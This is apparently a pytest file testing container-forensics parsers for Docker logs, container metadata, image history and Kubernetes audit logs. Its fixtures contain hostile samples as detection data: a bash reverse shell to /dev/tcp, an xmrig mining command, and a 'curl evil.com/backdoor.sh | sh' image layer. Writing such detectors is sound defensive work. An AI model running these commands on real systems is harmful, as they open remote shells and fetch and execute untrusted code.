"""Tests for mcp_server/tools/container.py (V1.1.0)."""
from __future__ import annotations

import pytest

from mcp_server.tools.container import (
    parse_container_metadata,
    parse_docker_logs,
    parse_image_history,
    parse_k8s_audit_logs,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

PRIVILEGED_METADATA: dict = {
    "Name": "/evil_container",
    "Created": "2024-11-01T02:00:00Z",
    "Config": {"Image": "malicious/image:latest"},
    "HostConfig": {
        "Privileged": True,
        "PidMode": "",
        "NetworkMode": "bridge",
        "IpcMode": "",
        "Binds": [],
        "CapAdd": [],
    },
}

SOCK_MOUNT_METADATA: dict = {
    "Name": "/docker_socket_mount",
    "Created": "2024-11-01T02:01:00Z",
    "Config": {"Image": "nginx:latest"},
    "HostConfig": {
        "Privileged": False,
        "PidMode": "",
        "NetworkMode": "bridge",
        "IpcMode": "",
        "Binds": ["/var/run/docker.sock:/var/run/docker.sock"],
        "CapAdd": [],
    },
}

CLEAN_METADATA: dict = {
    "Name": "/normal_app",
    "Created": "2024-11-01T09:00:00Z",
    "Config": {"Image": "myapp:1.0"},
    "HostConfig": {
        "Privileged": False,
        "PidMode": "",
        "NetworkMode": "bridge",
        "IpcMode": "",
        "Binds": ["/data:/app/data"],
        "CapAdd": [],
    },
}

REVERSE_SHELL_LOGS = [
    "2024-11-01 03:00:00 app starting",
    "2024-11-01 03:01:00 bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "2024-11-01 03:01:01 connection established",
]

CRYPTO_MINER_LOGS = [
    "2024-11-01 04:00:00 xmrig --pool pool.minexmr.com:4444 --user wallet123",
]

K8S_EXEC_LOG: dict = {
    "verb": "create",
    "objectRef": {
        "resource": "pods",
        "subresource": "exec",
        "namespace": "production",
    },
    "user": {"username": "unknown-user"},
    "sourceIPs": ["203.0.113.50"],
    "requestReceivedTimestamp": "2024-11-01T03:30:00Z",
    "userAgent": "kubectl/v1.28.0",
    "responseStatus": {"code": 101},
}

K8S_SECRETS_GET: dict = {
    "verb": "get",
    "objectRef": {
        "resource": "secrets",
        "subresource": "",
        "namespace": "kube-system",
    },
    "user": {"username": "service-account-compromised"},
    "sourceIPs": ["10.0.0.5"],
    "requestReceivedTimestamp": "2024-11-01T03:31:00Z",
    "userAgent": "curl/7.85.0",
    "responseStatus": {"code": 200},
}

K8S_BENIGN_LIST: dict = {
    "verb": "list",
    "objectRef": {"resource": "pods", "subresource": "", "namespace": "default"},
    "user": {"username": "ci-runner"},
    "sourceIPs": ["10.0.0.2"],
    "requestReceivedTimestamp": "2024-11-01T09:00:00Z",
    "userAgent": "kubectl/v1.28.0",
    "responseStatus": {"code": 200},
}

SUSPICIOUS_HISTORY: dict = {
    "CreatedBy": "RUN curl https://evil.com/backdoor.sh | sh",
    "Created": "2024-10-15T10:00:00Z",
    "Size": 1024,
}

CLEAN_HISTORY: dict = {
    "CreatedBy": "COPY . /app",
    "Created": "2024-10-15T09:00:00Z",
    "Size": 512,
}


# ---------------------------------------------------------------------------
# Docker Logs
# ---------------------------------------------------------------------------

class TestParseDockerLogs:
    def test_reverse_shell_detected(self) -> None:
        findings = parse_docker_logs("abc123def456", REVERSE_SHELL_LOGS)
        assert len(findings) >= 1
        titles = [f["title"] for f in findings]
        assert any("abc123def456"[:12] in t for t in titles)

    def test_crypto_miner_detected(self) -> None:
        findings = parse_docker_logs("gpu001", CRYPTO_MINER_LOGS)
        assert len(findings) == 1
        assert findings[0]["severity"] == "high"

    def test_clean_logs_return_empty(self) -> None:
        clean = ["app started", "GET /health 200", "DB connected"]
        assert parse_docker_logs("clean_container", clean) == []

    def test_empty_logs_return_empty(self) -> None:
        assert parse_docker_logs("test_id", []) == []

    def test_ttp_id_assigned(self) -> None:
        findings = parse_docker_logs("abc123", REVERSE_SHELL_LOGS)
        assert any("T1059.004" in f["ttp_ids"] for f in findings)

    def test_evidence_contains_line_number(self) -> None:
        findings = parse_docker_logs("abc123", REVERSE_SHELL_LOGS)
        assert any("Line 2" in " ".join(f["evidence"]) for f in findings)

    def test_html_in_log_line_escaped(self) -> None:
        evil_logs = ["bash -i <script>alert(1)</script> /dev/tcp/1.2.3.4/4444"]
        findings = parse_docker_logs("test123", evil_logs)
        assert "<script>" not in findings[0]["evidence"][0]


# ---------------------------------------------------------------------------
# Container Metadata
# ---------------------------------------------------------------------------

class TestParseContainerMetadata:
    def test_privileged_flag_detected(self) -> None:
        findings = parse_container_metadata(PRIVILEGED_METADATA)
        assert any("privileged" in f["title"].lower() for f in findings)

    def test_docker_sock_mount_detected(self) -> None:
        findings = parse_container_metadata(SOCK_MOUNT_METADATA)
        assert any("docker.sock" in f["title"].lower() for f in findings)

    def test_clean_container_returns_empty(self) -> None:
        assert parse_container_metadata(CLEAN_METADATA) == []

    def test_severity_is_critical(self) -> None:
        findings = parse_container_metadata(PRIVILEGED_METADATA)
        assert all(f["severity"] == "critical" for f in findings)

    def test_ttp_container_escape_assigned(self) -> None:
        findings = parse_container_metadata(PRIVILEGED_METADATA)
        assert any("T1611" in f["ttp_ids"] for f in findings)

    def test_image_name_in_evidence(self) -> None:
        findings = parse_container_metadata(PRIVILEGED_METADATA)
        evidence_str = " ".join(" ".join(f["evidence"]) for f in findings)
        assert "malicious/image:latest" in evidence_str

    def test_html_in_container_name_escaped(self) -> None:
        evil_meta = {**PRIVILEGED_METADATA, "Name": "/<script>alert(1)</script>"}
        findings = parse_container_metadata(evil_meta)
        assert "<script>" not in " ".join(" ".join(f["title"]) for f in findings)

    def test_hostpid_mode_detected(self) -> None:
        pid_meta = {**PRIVILEGED_METADATA,
                    "HostConfig": {**PRIVILEGED_METADATA["HostConfig"], "Privileged": False, "PidMode": "host"}}
        findings = parse_container_metadata(pid_meta)
        assert any("hostPID" in f["title"] for f in findings)


# ---------------------------------------------------------------------------
# Image History
# ---------------------------------------------------------------------------

class TestParseImageHistory:
    def test_malicious_curl_detected(self) -> None:
        findings = parse_image_history("evil:latest", [SUSPICIOUS_HISTORY])
        assert len(findings) == 1
        assert findings[0]["severity"] == "high"

    def test_clean_layer_filtered(self) -> None:
        assert parse_image_history("clean:1.0", [CLEAN_HISTORY]) == []

    def test_supply_chain_ttp(self) -> None:
        findings = parse_image_history("evil:latest", [SUSPICIOUS_HISTORY])
        assert "T1195.001" in findings[0]["ttp_ids"]

    def test_empty_history_returns_empty(self) -> None:
        assert parse_image_history("myapp:1.0", []) == []

    def test_image_name_in_title(self) -> None:
        findings = parse_image_history("evil:latest", [SUSPICIOUS_HISTORY])
        assert "evil:latest" in findings[0]["title"]


# ---------------------------------------------------------------------------
# Kubernetes Audit Logs
# ---------------------------------------------------------------------------

class TestParseK8sAuditLogs:
    def test_pod_exec_detected(self) -> None:
        findings = parse_k8s_audit_logs([K8S_EXEC_LOG])
        assert len(findings) == 1
        assert findings[0]["severity"] == "critical"

    def test_secrets_access_detected(self) -> None:
        findings = parse_k8s_audit_logs([K8S_SECRETS_GET])
        assert len(findings) == 1
        assert findings[0]["severity"] == "high"

    def test_benign_list_filtered(self) -> None:
        assert parse_k8s_audit_logs([K8S_BENIGN_LIST]) == []

    def test_source_ip_as_ioc(self) -> None:
        findings = parse_k8s_audit_logs([K8S_EXEC_LOG])
        assert findings[0]["ioc_value"] == "203.0.113.50"

    def test_ttp_exec_tagged(self) -> None:
        findings = parse_k8s_audit_logs([K8S_EXEC_LOG])
        assert "T1609" in findings[0]["ttp_ids"]

    def test_namespace_in_evidence(self) -> None:
        findings = parse_k8s_audit_logs([K8S_EXEC_LOG])
        evidence_str = " ".join(findings[0]["evidence"])
        assert "production" in evidence_str

    def test_empty_logs_returns_empty(self) -> None:
        assert parse_k8s_audit_logs([]) == []

    def test_user_agent_in_evidence(self) -> None:
        findings = parse_k8s_audit_logs([K8S_EXEC_LOG])
        evidence_str = " ".join(findings[0]["evidence"])
        assert "kubectl" in evidence_str

    def test_html_in_user_escaped(self) -> None:
        evil_log = {**K8S_EXEC_LOG, "user": {"username": "<b>evil</b>"}}
        findings = parse_k8s_audit_logs([evil_log])
        assert "<b>" not in findings[0]["description"]
